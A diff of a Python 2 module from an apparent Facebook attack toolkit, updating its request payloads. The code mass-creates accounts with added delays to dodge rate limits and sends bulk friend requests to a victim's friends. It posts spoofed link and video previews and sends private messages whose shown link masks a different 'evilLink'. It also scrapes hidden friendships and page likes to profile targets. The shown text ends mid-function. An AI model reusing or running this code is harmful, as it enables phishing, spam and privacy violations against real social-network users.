@@ -4,7 +4,7 @@ import MyParser
 from urllib import urlencode
 import simplejson as json
 import database
-from time import time,ctime
+from time import time,ctime,sleep
 import pickle
 import re
 from handlers import *
@@ -14,7 +14,7 @@ import matplotlib.pyplot as plt
 import numpy as np
 import community
 from networkx.drawing.nx_agraph import write_dot
-
+from base64 import b64encode
 
 def setGlobalLogginng():
     global globalLogging
@@ -161,7 +161,7 @@ def createUser(number):
             
             percentage = (i * 100.0) / int(number)
             print '\rCompleted [%.2f%%]\r'%percentage,
-            
+            sleep(60)
         except mechanize.HTTPError as e:
             logs(str(e.code) + ' on iteration ' + str(i))
             print str(e.code) + ' on iteration %d'%i
@@ -318,6 +318,9 @@ def sendRequestToList(victim):
     root = 'dumps'
     directory = victim
     friends = []
+    frieds_send = []
+    count = 0
+    number = raw_input('Insert the amount of requests to send: ')
     
     try:
         try:
@@ -326,7 +329,18 @@ def sendRequestToList(victim):
             logs('Friend file not found')
             print 'Friend file not found'
             return
-        
+        try:
+            persons_send = open(root+'/'+directory+'/'+victim+'_friend_send.txt',"rb")
+            while True:
+                linea = persons_send.readline()
+                if not linea:
+                    break
+                frieds_send.append(linea.strip("\n\r"))
+            persons_send.close()
+            persons_send = open(root+'/'+directory+'/'+victim+'_friend_send.txt',"ab")
+        except:
+            persons_send = open(root+'/'+directory+'/'+victim+'_friend_send.txt',"wb")
+            
         while True:
             linea = persons.readline()
             if not linea:
@@ -338,54 +352,62 @@ def sendRequestToList(victim):
         
         print 'Sending friend requests'
         
+                
         for userID in friends:        
-            
-            ''' Selects the fb_dtsg form '''   
-            set_dtsg()
-            c_user = getC_user()
+            if userID not in frieds_send:
+                #Escape condition
+                if count > int(number):
+                    persons_send.close()
+                    return
                 
-            arguments = {
-                'to_friend' : userID,
-                'action' : 'add_friend',
-                'how_found' : 'profile_button',
-                'ref_param' : 'none',
-                'link_data[gt][profile_owner]' : userID,
-                'link_data[gt][ref]' : 'timeline:timeline',
-                'outgoing_id' : '',
-                'logging_location' : '',
-                'no_flyout_on_click' : 'true',
-                'ego_log_data' : '',
-                'http_referer' : '',
-                '__user' : c_user,
-                '__a' : '1',
-                '__dyn' : '7n8aD5z5zu',
-                '__req' : 'n',
-                'fb_dtsg' : br.form['fb_dtsg'],
-                'phstamp' : '1658165688376111103320'
-                }
-            
-    
-            datos = urlencode(arguments)
-            try:
-                response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
-                
-                #percentage
-                percentage = (i * 100.0) / len(friends)
-                i+=1
-                print '\rCompleted [%.2f%%]\r'%percentage,
-                        
-                if globalLogging:
-                    logs(response.read())
+                count += 1
+                ''' Selects the fb_dtsg form '''   
+                set_dtsg()
+                c_user = getC_user()
                     
-                print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
-            except:
-                logs('Error sending request ')
-                print 'Error sending request \n'
+                arguments = {
+                    'to_friend' : userID,
+                    'action' : 'add_friend',
+                    'how_found' : 'profile_button',
+                    'ref_param' : 'none',
+                    'link_data[gt][profile_owner]' : userID,
+                    'link_data[gt][ref]' : 'timeline:timeline',
+                    'outgoing_id' : '',
+                    'logging_location' : '',
+                    'no_flyout_on_click' : 'true',
+                    'ego_log_data' : '',
+                    'http_referer' : '',
+                    '__user' : c_user,
+                    '__a' : '1',
+                    '__dyn' : '7n8aD5z5zu',
+                    '__req' : 'n',
+                    'fb_dtsg' : br.form['fb_dtsg'],
+                    'ttstamp' : '265817211599516953787450107',
+                    }
+                
+        
+                datos = urlencode(arguments)
+                try:
+                    response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
+                    
+                    #percentage
+                    percentage = (i * 100.0) / len(friends)
+                    i+=1
+                    print '\rCompleted [%.2f%%]\r'%percentage,
+                            
+                    if globalLogging:
+                        logs(response.read())
+                        
+                    print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
+                    persons_send.write(userID+'\n')
+                except:
+                    logs('Error sending request ')
+                    print 'Error sending request \n'
     except signalCaught as e:
-        deleteUser()
         message = '%s catch from send request module' %e.args[0]
         logs(str(message))
         print '%s \n' %message
+        persons_send.close()
         raw_input('Press enter to continue')
         return
 
@@ -575,19 +597,22 @@ def appMessageSpoof(appId,link,picture,title,domain,description,comment):
     except:
         logs('Error en el modulo de appMessageSpoof()')
         print 'Error en el modulo de appMessageSpoof()\n'
+   
 
-def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID):
+def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID, privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
         set_dtsg()
         arguments = {
             'fb_dtsg' : br.form['fb_dtsg'],
-            'xhpc_context' : 'home',
+            'composer_session_id' : '38c20e73-acfc-411a-8313-47c095b01e42',
+            'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
-            'xhpc_timeline' : '',
-            'xhpc_composerid' : 'u_jsonp_5_0',
+            'xhpc_timeline' : '1',
+            'xhpc_composerid' : 'u_0_29',
             'xhpc_targetid' : str(c_user),
+            'clp' : '{ cl_impid : 65ac6257 , clearcounter :0, elementid : u_0_2n , version : x , parent_fbid :'+str(c_user)+'}',
             'xhpc_message_text' : str(comment),
             'xhpc_message' : str(comment),
             'aktion' : 'post',
@@ -602,15 +627,15 @@ def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID):
             'attachment[params][medium]' : '103',
             'attachment[params][url]' : str(videoLink),
             'attachment[params][video][0][type]' : 'application/x-shockwave-flash',
-            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/'+str(videoID)+'?version=3&autohide=1&autoplay=1',
-            'attachment[params][video][0][width]' : '1920',
-            'attachment[params][video][0][height]' : '1080',
+            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/FxyecjOQXnI?autohide=1&version=3&autoplay=1',
+            'attachment[params][video][0][width]' : '1280',
+            'attachment[params][video][0][height]' : '720',
             'attachment[params][video][0][safe]' : '1',
             'attachment[type]' : '100',
             'link_metrics[source]' : 'ShareStageExternal',
             'link_metrics[domain]' : 'www.youtube.com',
             'link_metrics[base_domain]' : 'youtube.com',
-            'link_metrics[title_len]' : '54',
+            'link_metrics[title_len]' : '92',
             'link_metrics[summary_len]' : '160',
             'link_metrics[min_dimensions][0]' : '70',
             'link_metrics[min_dimensions][1]' : '70',
@@ -623,41 +648,73 @@ def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID):
             'link_metrics[images_considered]' : '1',
             'link_metrics[images_cap]' : '10',
             'link_metrics[images_type]' : 'images_array',
-            'composer_metrics[best_image_w]' : '100',
-            'composer_metrics[best_image_h]' : '100',
+            'composer_metrics[best_image_w]' : '398',
+            'composer_metrics[best_image_h]' : '208',
             'composer_metrics[image_selected]' : '0',
             'composer_metrics[images_provided]' : '1',
             'composer_metrics[images_loaded]' : '1',
             'composer_metrics[images_shown]' : '1',
-            'composer_metrics[load_duration]' : '515',
+            'composer_metrics[load_duration]' : '1058',
             'composer_metrics[timed_out]' : '0',
             'composer_metrics[sort_order]' : '',
             'composer_metrics[selector_type]' : 'UIThumbPager_6',
+            'backdated_date[year]' : '',
+            'backdated_date[month]' : '',
+            'backdated_date[day]' : '',
+            'backdated_date[hour]' : '',
+            'backdated_date[minute]' : '',
             'is_explicit_place' : '',
+            'composertags_place' : '',
+            'composertags_place_name' : '',
+            'tagger_session_id' : '1394761251',
+            'action_type_id[0]' : '',
+            'object_str[0]' : '',
+            'object_id[0]' : '',
+            'og_location_id[0]' : '',
+            'hide_object_attachment' : '0',
+            'og_suggestion_mechanism' : '',
+            'composertags_city' : '',
+            'disable_location_sharing' : 'false',
+            'composer_predicted_city' : '',
+            'audience[0][value]' : privacy,
+            'nctr[_mod]' : 'pagelet_timeline_recent',
+            '__user' : str(c_user),
+            '__a' : '1',
+            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
+            '__req' : 'm',
+            'ttstamp' : '26581658074898653',
+            '__rev' : '1161243',
             }
         
         datos = urlencode(arguments)
-        response = br.open('https://www.facebook.com/ajax/profile/composer.php',datos)
+        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
         
         if globalLogging:
                 logs(response.read())
-                
+    
+    except mechanize.HTTPError as e:
+        print e.code
+    
+    except mechanize.URLError as e:
+            print e.reason.args              
     except:
         logs('Error en el modulo de linkPreviewYoutube()')
         print 'Error en el modulo de linkPreviewYoutube()\n'
         
-def linkPreview(link,realLink,title,summary,comment,image):
+def linkPreview(link,realLink,title,summary,comment,image,privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
         set_dtsg()
         arguments = {
+            'composer_session_id' : '787d2fec-b5c1-41fe-bbda-3450a03240c6',
             'fb_dtsg' : br.form['fb_dtsg'],
             'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
             'xhpc_timeline' : '1',
-            'xhpc_composerid' : 'u_jsonp_2_c',
+            'xhpc_composerid' : 'u_0_29',
             'xhpc_targetid' : str(c_user),
+            'clp' : '{"cl_impid":"27c5e963","clearcounter":0,"elementid":"u_0_2n","version":"x","parent_fbid":'+str(c_user)+'}',
             'xhpc_message_text' : str(comment),
             'xhpc_message' : str(comment),
             'aktion' : 'post',
@@ -675,17 +732,17 @@ def linkPreview(link,realLink,title,summary,comment,image):
             'link_metrics[source]' : 'ShareStageExternal',
             'link_metrics[domain]' : str(realLink),
             'link_metrics[base_domain]' : str(realLink),
-            'link_metrics[title_len]' : '33',
-            'link_metrics[summary_len]' : '108',
+            'link_metrics[title_len]' : '38',
+            'link_metrics[summary_len]' : '38',
             'link_metrics[min_dimensions][0]' : '70',
             'link_metrics[min_dimensions][1]' : '70',
-            'link_metrics[images_with_dimensions]' : '1',
+            'link_metrics[images_with_dimensions]' : '3',
             'link_metrics[images_pending]' : '0',
             'link_metrics[images_fetched]' : '0',
-            'link_metrics[image_dimensions][0]' : '200',
-            'link_metrics[image_dimensions][1]' : '200',
+            'link_metrics[image_dimensions][0]' : '322',
+            'link_metrics[image_dimensions][1]' : '70',
             'link_metrics[images_selected]' : '1',
-            'link_metrics[images_considered]' : '1',
+            'link_metrics[images_considered]' : '5',
             'link_metrics[images_cap]' : '3',
             'link_metrics[images_type]' : 'ranked',
             'composer_metrics[best_image_w]' : '100',
@@ -694,7 +751,7 @@ def linkPreview(link,realLink,title,summary,comment,image):
             'composer_metrics[images_provided]' : '1',
             'composer_metrics[images_loaded]' : '1',
             'composer_metrics[images_shown]' : '1',
-            'composer_metrics[load_duration]' : '299',
+            'composer_metrics[load_duration]' : '812',
             'composer_metrics[timed_out]' : '0',
             'composer_metrics[sort_order]' : '',
             'composer_metrics[selector_type]' : 'UIThumbPager_6',
@@ -706,41 +763,54 @@ def linkPreview(link,realLink,title,summary,comment,image):
             'is_explicit_place' : '',
             'composertags_place' : '',
             'composertags_place_name' : '',
-            'composer_session_id' : '1371889360',
+            'tagger_session_id' : '1394765332',
+            'action_type_id[0]' : '',
+            'object_str[0]' : '',
+            'object_id[0]' : '',
+            'og_location_id[0]' : '',
+            'hide_object_attachment' : '0',
+            'og_suggestion_mechanism' : '',
             'composertags_city' : '',
             'disable_location_sharing' : 'false',
-            'composer_predicted_city' : '106423786059675',
-            'audience[0][value]' : '10',
+            'composer_predicted_city' : '',
+            'audience[0][value]' : privacy,
             'nctr[_mod]' : 'pagelet_timeline_recent',
             '__user' : str(c_user),
             '__a' : '1',
-            '__dyn' : '7n8ahyj2qmpnDzk9UmAEXw',
-            '__req' : '9',
-            'phstamp' : '16581659510745851082338'
+            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
+            '__req' : 'h',
+            'ttstamp' : '26581658074898653',
+            '__rev' : '1161243'
             }
         
         datos = urlencode(arguments)
-        response = br.open('https://www.facebook.com/ajax/profile/composer.php',datos)
+        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
         
         if globalLogging:
                 logs(response.read())
-        
+    
+    except mechanize.HTTPError as e:
+        print e.code
+    except mechanize.URLError as e:
+            print e.reason.args  
+                
     except:
         logs('Error en el modulo de linkPreview()')
         print 'Error en el modulo de linkPreview()\n'
         
-def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo):
+def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
     c_user = getC_user()
     print str(c_user)+'\n'
     try:
         set_dtsg()
         arguments = {
-            'fb_dtsg' : br.form['fb_dtsg'],
-            'xhpc_context' : 'home',
+            'composer_session_id' : '38c20e73-acfc-411a-8313-47c095b01e42',
+            'xhpc_context' : 'profile',
             'xhpc_ismeta' : '1',
-            'xhpc_timeline' : '',
-            'xhpc_composerid' : 'u_jsonp_5_0',
+            'xhpc_timeline' : '1',
+            'xhpc_composerid' : 'u_0_29',
             'xhpc_targetid' : str(c_user),
+            'clp' : '{ cl_impid : 65ac6257 , clearcounter :0, elementid : u_0_2n , version : x , parent_fbid :'+str(c_user)+'}',
             'xhpc_message_text' : str(comment),
             'xhpc_message' : str(comment),
             'aktion' : 'post',
@@ -763,7 +833,7 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo):
             'link_metrics[source]' : 'ShareStageExternal',
             'link_metrics[domain]' : 'www.youtube.com',
             'link_metrics[base_domain]' : 'youtube.com',
-            'link_metrics[title_len]' : '54',
+            'link_metrics[title_len]' : '92',
             'link_metrics[summary_len]' : '160',
             'link_metrics[min_dimensions][0]' : '70',
             'link_metrics[min_dimensions][1]' : '70',
@@ -776,17 +846,44 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo):
             'link_metrics[images_considered]' : '1',
             'link_metrics[images_cap]' : '10',
             'link_metrics[images_type]' : 'images_array',
-            'composer_metrics[best_image_w]' : '100',
-            'composer_metrics[best_image_h]' : '100',
+            'composer_metrics[best_image_w]' : '398',
+            'composer_metrics[best_image_h]' : '208',
             'composer_metrics[image_selected]' : '0',
             'composer_metrics[images_provided]' : '1',
             'composer_metrics[images_loaded]' : '1',
             'composer_metrics[images_shown]' : '1',
-            'composer_metrics[load_duration]' : '515',
+            'composer_metrics[load_duration]' : '1058',
             'composer_metrics[timed_out]' : '0',
             'composer_metrics[sort_order]' : '',
             'composer_metrics[selector_type]' : 'UIThumbPager_6',
+            'backdated_date[year]' : '',
+            'backdated_date[month]' : '',
+            'backdated_date[day]' : '',
+            'backdated_date[hour]' : '',
+            'backdated_date[minute]' : '',
             'is_explicit_place' : '',
+            'composertags_place' : '',
+            'composertags_place_name' : '',
+            'tagger_session_id' : '1394761251',
+            'action_type_id[0]' : '',
+            'object_str[0]' : '',
+            'object_id[0]' : '',
+            'og_location_id[0]' : '',
+            'hide_object_attachment' : '0',
+            'og_suggestion_mechanism' : '',
+            'composertags_city' : '',
+            'disable_location_sharing' : 'false',
+            'composer_predicted_city' : '',
+            'audience[0][value]' : privacy,
+            'nctr[_mod]' : 'pagelet_timeline_recent',
+            'is_explicit_place' : '',
+            'nctr[_mod]' : 'pagelet_timeline_recent',
+            '__user' : str(c_user),
+            '__a' : '1',
+            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
+            '__req' : 'm',
+            'ttstamp' : '26581658074898653',
+            '__rev' : '1161243',
             }
         
         datos = urlencode(arguments)
@@ -868,15 +965,14 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
     try:
         set_dtsg()
         arguments = {
-            'w' : '398',
             'message_batch[0][action_type]' : 'ma-type:user-generated-message',
             'message_batch[0][thread_id]' : '',
             'message_batch[0][author]' : 'fbid:'+c_user,
             'message_batch[0][author_email]' : '',
             'message_batch[0][coordinates]' : '',
-            'message_batch[0][timestamp]' : '1387237764222',
+            'message_batch[0][timestamp]' : '1394766424499',
             'message_batch[0][timestamp_absolute]' : 'Today',
-            'message_batch[0][timestamp_relative]' : '8:49pm',
+            'message_batch[0][timestamp_relative]' : '12:07am',
             'message_batch[0][timestamp_time_passed]' : '0',
             'message_batch[0][is_unread]' : 'false',
             'message_batch[0][is_cleared]' : 'false',
@@ -888,62 +984,60 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
             'message_batch[0][has_attachment]' : 'true',
             'message_batch[0][html_body]' : 'false',
             'message_batch[0][specific_to_list][0]' : 'fbid:' + victim,
-            'message_batch[0][force_sms]' : 'true',
-            'message_batch[0][ui_push_phase]' : 'V3',
             'message_batch[0][content_attachment][subject]' : subject,
             'message_batch[0][content_attachment][app_id]' : '2309869772',
             'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : realLink,
             'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : realLink,
             'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : evilLink,
-            'message_batch[0][content_attachment][attachment][params][favicon]' : 'http://www.whatever.com/favicon.ico',
+            'message_batch[0][content_attachment][attachment][params][favicon]' : realLink+'/favicon.ico',
             'message_batch[0][content_attachment][attachment][params][title]' : title,
             'message_batch[0][content_attachment][attachment][params][summary]' : summary,
             'message_batch[0][content_attachment][attachment][params][images][0]' : imageLink,
-            'h' : '208',
-            'url' : imageLink,
-            'cfs' : '1',
             'message_batch[0][content_attachment][attachment][params][medium]' : '106',
             'message_batch[0][content_attachment][attachment][params][url]' : realLink,
             'message_batch[0][content_attachment][attachment][type]' : '100',
             'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
-            'message_batch[0][content_attachment][link_metrics][domain]' : 'www.mkit.com.ar',
-            'message_batch[0][content_attachment][link_metrics][base_domain]' : 'mkit.com.ar',
+            'message_batch[0][content_attachment][link_metrics][domain]' : realLink.strip('https://').strip('/'),
+            'message_batch[0][content_attachment][link_metrics][base_domain]' : realLink.strip('https://www.').strip('/'),
             'message_batch[0][content_attachment][link_metrics][title_len]' : '38',
-            'message_batch[0][content_attachment][link_metrics][summary_len]' : '180',
+            'message_batch[0][content_attachment][link_metrics][summary_len]' : '38',
             'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
             'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
             'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '3',
             'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
             'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
-            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '856',
-            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '566',
-            'message_batch[0][content_attachment][link_metrics][images_selected]' : '3',
+            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '322',
+            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '70',
+            'message_batch[0][content_attachment][link_metrics][images_selected]' : '1',
             'message_batch[0][content_attachment][link_metrics][images_considered]' : '5',
             'message_batch[0][content_attachment][link_metrics][images_cap]' : '3',
             'message_batch[0][content_attachment][link_metrics][images_type]' : 'ranked',
-            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '398',
-            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '208',
+            'message_batch[0][content_attachment][composer_metrics][best_image_w]' : '100',
+            'message_batch[0][content_attachment][composer_metrics][best_image_h]' : '100',
             'message_batch[0][content_attachment][composer_metrics][image_selected]' : '0',
-            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '3',
-            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '3',
-            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '3',
-            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '0',
+            'message_batch[0][content_attachment][composer_metrics][images_provided]' : '1',
+            'message_batch[0][content_attachment][composer_metrics][images_loaded]' : '1',
+            'message_batch[0][content_attachment][composer_metrics][images_shown]' : '1',
+            'message_batch[0][content_attachment][composer_metrics][load_duration]' : '6',
             'message_batch[0][content_attachment][composer_metrics][timed_out]' : '0',
             'message_batch[0][content_attachment][composer_metrics][sort_order]' : '',
             'message_batch[0][content_attachment][composer_metrics][selector_type]' : 'UIThumbPager_6',
+            'message_batch[0][force_sms]' : 'true',
+            'message_batch[0][ui_push_phase]' : 'V3',
             'message_batch[0][status]' : '0',
-            'message_batch[0][message_id]' : '<1387237764222:1517510061-619853692@mail.projektitan.com>',
-            'client' : 'mercury',
+            'message_batch[0][message_id]' : '<1394766424499:3126670212-4125121119@mail.projektitan.com>',
+            'message_batch[0][client_thread_id]' : 'user:'+str(c_user),
+            'client' : 'web_messenger',
             '__user' : c_user,
             '__a' : '1',
-            '__dyn' : '7n8a9EAMNpGvyVQ9UmWOGUGy6zECQqbx2mbAKGiCw',
-            '__req' : 'f',
+            '__dyn' : '7n8a9EAMBlCFYwyt2u6aOGeExEW9J6yUgByVbGAF4iGGeqheCu6po',
+            '__req' : '1n',
             'fb_dtsg' : br.form['fb_dtsg'],
-            '__rev' : '1048858',
-            'ttstamp' : '265816888106986872',
+            'ttstamp' : '26581658074898653',
+            '__rev' : '1161243'
             }
         datos = urlencode(arguments)
-        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
+        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
         
         if globalLogging:
                 logs(response.read())
@@ -1060,7 +1154,7 @@ def linkFriends(victim):
     friends = []
     root = 'dumps'
     directory = victim
-    
+    delay = 1
     linkedFile = open(root+'/'+directory+'/'+victim+'friend_links.html',"wb")
     
     try:
@@ -1096,168 +1190,41 @@ def linkFriends(victim):
         
         except mechanize.HTTPError as e:
                 print e.code
+                print 'Sleeping %d' %delay
+                sleep(delay)
+                delay += 1
         except mechanize.URLError as e:
                 print e.reason.args
+                print 'Sleeping %d URLerror ' %delay
+                sleep(delay)
+                delay += 1
     
     linkedFile.close()
     
 def getName(userId):
-    try:
-        response = br.open('https://graph.facebook.com/'+str(userId))
-        resultado = response.read()
-        json_dump = json.loads(resultado)
+    delay = 0
+    while delay < 60:
         try:
-            return str(json_dump['username'])
-        except:
-            return str(userId)
-    
-    except mechanize.HTTPError as e:
-            print e.code
-            return str(userId)
-    except mechanize.URLError as e:
-            print e.reason.args
-            return str(userId)
-
-''' 
-def bypassFriendshipPrivacyPlot(victim, transitive,fileName):
-    import networkx as nx
-    import matplotlib.pyplot as plt
-    import numpy as np
-    
-    coleccion = {}
-    
-    myGraph = nx.Graph()
-    victima = getName(victim)
-    myGraph.add_node(victima)
-    
-    
-    #Percentage container
-    percentage = 0.0
-    #Disclosude friends container
-    friendships = []
-    #Already visited nodes container
-    visited = []  
-    try:
-        #If the file already exists 
-        friendshipFile = open('dumps/'+fileName,"rb")
-        #Reads every line of the file
-        while True:
-            linea = friendshipFile.readline()
-            if not linea:
-                break
-            #Store in the visited array for non repetition
-            visited.append(linea.strip("\n\r"))
-    
-        friendshipFile.close()
-    
-    except:
-        #If the file does not exists, creates the file
-        friendshipFile = open('dumps/'+fileName,"wb")
-        friendshipFile.close()
-     
-    
-    try:
-        #Generates the first level of the search
-        result = coreFriendshipPrivacy(victim,transitive)
-    except:
-        print 'Check the internet connection please..'
-        return
-    
-    #Stores non repetitive values in the disclosed friends container
-    for individuos in result:
-        if individuos not in visited:
-            if coleccion.has_key(individuos) == False:
-                nodo = getName(individuos)
-                coleccion[individuos] = nodo
-            else:
-                nodo = coleccion[individuos]
-            
-            if coleccion.has_key(transitive) == False:
-                transitivo = getName(transitive)
-                coleccion[transitive] = transitivo
-            else:
-                transitivo = coleccion[transitive]
-            
-            myGraph.add_node(nodo)
-            myGraph.add_edge(nodo,transitivo)
-            friendships.append(individuos)
-    
-    #Counter for percentage calculus purpose 
-    i = 0.0    
-    #For every value in the first disclosed list, repeats until every value has been tryed    
-    for friends in friendships:
-        #Percentage calculus 
-        percentage = (i * 100.0)/len(friendships)
-        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
-        i+=1
-        #Only if the node wasn't visited 
-        if friends not in visited:
-            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
-            #Only if the try passes, the infinite while will end. (For internet error connection problem)
-            state = True
-            while state == True:
-                try:
-                    result = coreFriendshipPrivacy(victim,friends)
-                    state = False
-                except signalCaught as e:
-                    state = False
-                    print 'Signal Caught handler'
-                    print '%s ' %e.args[0]
-                    return
-                except:
-                    print '\rCheck the internet connection please..\r'
-            
-            #Stores non repetitive values in the disclosed friends container    
-            for element in result:
-                if element not in friendships:
-                    if coleccion.has_key(friends) == False:
-                        nodo = getName(friends)
-                        coleccion[friends] = nodo
-                    else:
-                        nodo = coleccion[friends]
-                    
-                    if coleccion.has_key(element) == False:
-                        transitivo = getName(element)
-                        coleccion[element] = transitivo
-                    else:
-                        transitivo = coleccion[element]
-
-                    myGraph.add_node(nodo)
-                    myGraph.add_edge(nodo,transitivo)
-                    friendships.append(element)
-            
-            #Stores every single value of friendships list alredy analyzed for non repetitivness
-            visited.append(friends)
-            
-    #Check if the file exists, if true append, else create and writes
-    try:
-        friendshipFile = open('dumps/'+fileName,"ab")
-    except:
-        friendshipFile = open('dumps/'+fileName,"wb")
+            response = br.open('https://graph.facebook.com/'+str(userId))
+            resultado = response.read()
+            json_dump = json.loads(resultado)
+            try:
+                return str(json_dump['username'])
+            except:
+                return str(userId)
         
-    #Stores every userID for further analyzis
-    for friends in friendships:
-        if coleccion.has_key(friends) == False:
-            transitivo = getName(friends)
-            coleccion[friends] = transitivo
-        else:
-            transitivo = coleccion[friends]
+        except mechanize.HTTPError as e:
+                print str(e.code) + 'Increasing delay %d' %delay
+                delay += 30 
+                sleep(delay)
+        except mechanize.URLError as e:
+                print str(e.reason.args)  + 'Increasing delay %d' %delay
+                delay += 30
+                sleep(delay)
+                
+    #In case the while ends
+    return str(userId)
 
-        myGraph.add_edge(victima,transitivo)
-        friendshipFile.write(str(friends)+'\n')
-    
-    friendshipFile.close()
-    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = np.linspace(0,1,len(myGraph.edges())) ,with_labels=False)
-    plt.savefig("graph_color.pdf")
-    plt.savefig("graph_color.png")  
-    plt.show()
-    
-    nx.draw_spring(myGraph,node_color = np.linspace(0,1,len(myGraph.nodes())),edge_color = '#000000' ,with_labels=False)
-    plt.savefig("graph_ByW.pdf")
-    plt.savefig("graph_ByW.png") 
-    plt.show()
-    
-'''
 
 def mkdir(directory,root):
     import os
@@ -1339,6 +1306,7 @@ def analyzeGraph(victim):
     edgesValues = {}
     nodekeys = {}
     userNames = []
+    commonPages = {}
     
     A,idkeys = loadObjects(victim)
     if A != []:       
@@ -1359,6 +1327,7 @@ def analyzeGraph(victim):
         print 'Attemping to get user\'s information'
         for elements in idkeys.keys():
             user = getName(elements)
+            commonPages[user] = corePagesLike(victim,elements)
             userNames.append(user)
             nodekeys[idkeys[elements]] = user
             percentage = (i * 100.0)/len(idkeys.keys())
@@ -1401,7 +1370,7 @@ def analyzeGraph(victim):
         labelGraph = nx.Graph()
         
         for label in labelNodes:
-            labelGraph.add_node(nodekeys[int(label)])
+            labelGraph.add_node(nodekeys[int(label)],likes=commonPages[nodekeys[int(label)]])
         
         for labelE in labelEdges:
             labelGraph.add_edge(nodekeys[int(labelE[0])],nodekeys[int(labelE[1])])
@@ -1423,16 +1392,6 @@ def analyzeGraph(victim):
         for i in set(partition.values()):
             print "Community", i
             members = [nodes for nodes in partition.keys() if partition[nodes] == i]
-            
-            ''' No longer necessary (?) 
-            reference = open(root+"/"+directory+"/community"+str(i)+"references.txt","wb")
-            
-            for nodes in members:
-                line = str(nodekeys[int(nodes)])+' : '+str(nodes) 
-                reference.write(line + '\n')
-            
-            reference.close()           
-            ''' 
             
             egonet = labelGraph.subgraph(set(members))
             print sorted(egonet.nodes(),reverse=False)
@@ -1617,7 +1576,8 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     plt.savefig(root+'/'+directory+'/'+victim+"graph_color.png")
     write_dot(myGraph,root+'/'+directory+'/'+victim+"graph_color.dot")	
     plt.show()
-    
+
+   
     
 def bypassFriendshipPrivacy(victim, transitive):
     #Percentage container
@@ -1706,6 +1666,174 @@ def bypassFriendshipPrivacy(victim, transitive):
     
     friendshipFile.close()
 
+def corePagesLike(victim,transitive):
+    matchs = []
+    begin = 0
+    page = []
+    
+    try:
+        response = br.open('https://www.facebook.com/'+str(victim)+'?and='+str(transitive)+'&sk=favorites')
+        resultado = response.read()
+        match = re.search('timelineFriendsColumnHeader',resultado)
+        if match is not None:
+            linea = re.search('timelineFriendsColumnHeader(.+)',resultado).group()
+
+    except mechanize.HTTPError as e:
+            print e.code
+            #Should handle a custom error
+            raise
+    except mechanize.URLError as e:
+            print e.reason.args
+            #Should handle a custom error
+            raise
+    #Error connection the upper function will catch the exception
+    except:
+        raise
+    
+    while True:
+        match = re.search('fbStreamTimelineFavInfoContainer',resultado[begin:])
+        if match != None:
+            matchEnd = re.search('\n',resultado[begin+match.start():])
+            if matchEnd != None:
+                matchs.append(resultado[begin+match.start():matchEnd.end()+begin+match.start()])
+                begin = matchEnd.end()+begin+match.start()
+                match = None
+                matchEnd = None
+        else:
+            break
+    
+    
+    for linea in matchs:
+        start = 0
+        try:
+            #Search the string to get the position of the starting match
+            matchAnd = re.search('page\.php\?id=',linea[start:])
+            #Search the end of the match for taking the id length
+            matchEnd = re.search('">',linea[start+matchAnd.end():])
+            #If we have a start and an end, we have the id value
+        except:
+            print 'ERROR'
+            
+        
+        if (matchAnd and matchEnd) is not None:
+            #Appends the value given the proper position (resolved a few lines up)
+            page.append(linea[start+matchAnd.end():start+matchEnd.start()+matchAnd.end() ])
+            #Moves the pointer for next match
+            start += matchEnd.start()+matchAnd.end() 
+    return page
+
+def checkPrivacy(victim):
+    try:
+            response = br.open('https://www.facebook.com/'+str(victim)+'?sk=friends')
+            resultado = response.read()
